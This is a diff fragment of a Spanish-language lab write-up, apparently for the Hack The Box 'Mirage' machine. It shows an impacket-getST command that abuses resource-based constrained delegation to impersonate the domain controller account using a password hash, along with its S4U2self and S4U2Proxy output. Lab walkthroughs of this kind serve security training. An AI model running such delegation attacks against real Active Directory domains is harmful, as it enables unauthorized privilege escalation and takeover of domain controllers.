@@ -1162,12 +1162,13 @@ Ahora en teoría podremos abusar de RBCD para obtener un ticket de servicio priv
 
 ~~~ bash
 KRB5CCNAME=Mirage-Service\$.ccache impacket-getST -spn 'cifs/DC01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.10.11.78 'mirage.htb/Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866
+
 Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Impersonating dc01$
 [*] 	Requesting S4U2self
 [*] 	Requesting S4U2Proxy
-[*] Saving ticket in dc01$.ccache
+[*] Saving ticket in dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache
 ~~~
 
 
